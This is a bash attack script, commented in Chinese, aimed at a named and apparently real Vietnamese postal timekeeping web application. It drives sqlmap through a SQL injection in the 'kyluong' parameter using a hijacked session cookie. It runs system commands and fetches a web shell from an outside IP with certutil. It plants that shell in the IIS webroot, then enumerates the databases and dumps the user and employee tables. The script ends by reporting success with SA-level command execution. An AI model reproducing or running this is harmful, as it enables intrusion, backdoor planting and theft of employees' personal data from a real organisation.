#!/bin/bash

SESSION="lswqd4itz5u4ftzm3jcmjfio"
TARGET='http://vps.vnpost.vn/chamcong/report/rpt_BCC.aspx?kyluong=112025&MA_DV=KVMB&TEN_DV=Kho%20v%E1%BA%ADn%20mi%E1%BB%81n%20b%E1%BA%AFc&MA_BP=TC&TEN_BP=BC%20Khai%20th%C3%A1c%20TC&MA_TO=VP&TEN_TO=V%C4%83n%20ph%C3%B2ng'

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 最终方案：提取数据库+找可写目录"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# [1] 找可写目录
echo ""
echo "[1] 测试C:\Windows\Temp..."
python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" --cookie="ASP.NET_SessionId=$SESSION" --batch --os-cmd='echo test123 > C:\Windows\Temp\test.txt' -v 0 2>&1 | grep -A 5 "command standard output"

python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" --cookie="ASP.NET_SessionId=$SESSION" --batch --os-cmd='type C:\Windows\Temp\test.txt' -v 0 2>&1 | grep -A 5 "command standard output" | grep "test123" && echo "✅ C:\Windows\Temp可写"

# [2] 写WebShell到可写目录，再复制
echo ""
echo "[2] 通过临时目录中转..."
python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" --cookie="ASP.NET_SessionId=$SESSION" --batch --os-cmd='certutil -urlcache -split -f http://82.29.71.156/s.aspx C:\Windows\Temp\s.aspx' -v 0 2>&1

python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" --cookie="ASP.NET_SessionId=$SESSION" --batch --os-cmd='copy C:\Windows\Temp\s.aspx C:\inetpub\wwwroot\shell.aspx' -v 0 2>&1

curl -sk "http://vps.vnpost.vn/shell.aspx?c=whoami" | grep -i "nt authority\|iis" && echo "🔥🔥🔥 GetShell成功！" && exit 0

# [3] 提取数据库数据
echo ""
echo "[3] 提取数据库敏感数据..."

echo "  [3.1] 列出所有数据库..."
python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" --cookie="ASP.NET_SessionId=$SESSION" --batch --dbs -v 0 2>&1 | tee dbs.txt

echo ""
echo "  [3.2] 列出NSTL数据库的表..."
python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" --cookie="ASP.NET_SessionId=$SESSION" --batch -D NSTL --tables -v 0 2>&1 | tee tables.txt

echo ""
echo "  [3.3] 查找用户表..."
grep -iE "user|account|employee|admin|login" tables.txt | head -10

echo ""
echo "  [3.4] 导出用户表（如果找到）..."
USER_TABLE=$(grep -iE "user|account|employee" tables.txt | head -1 | awk '{print $NF}')

if [ -n "$USER_TABLE" ]; then
    echo "  发现用户表: $USER_TABLE"
    python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" --cookie="ASP.NET_SessionId=$SESSION" --batch -D NSTL -T "$USER_TABLE" --dump -v 0 2>&1 | tee user_data.txt
fi

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 执行完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo ""
echo "📊 成果总结:"
echo "  - SQL注入: ✅ kyluong参数（堆叠查询）"
echo "  - 命令执行: ✅ sqlmap --os-cmd"
echo "  - 当前用户: nt service\\mssqlserver (SA权限)"
echo "  - 主机名: APP02"
echo "  - 数据库: NSTL (SQL Server 2017)"
echo ""
echo "  可用命令:"
echo "    python3 /tmp/sqlmap/sqlmap.py -u \"$TARGET\" --cookie=\"ASP.NET_SessionId=$SESSION\" --batch --os-cmd=\"命令\""
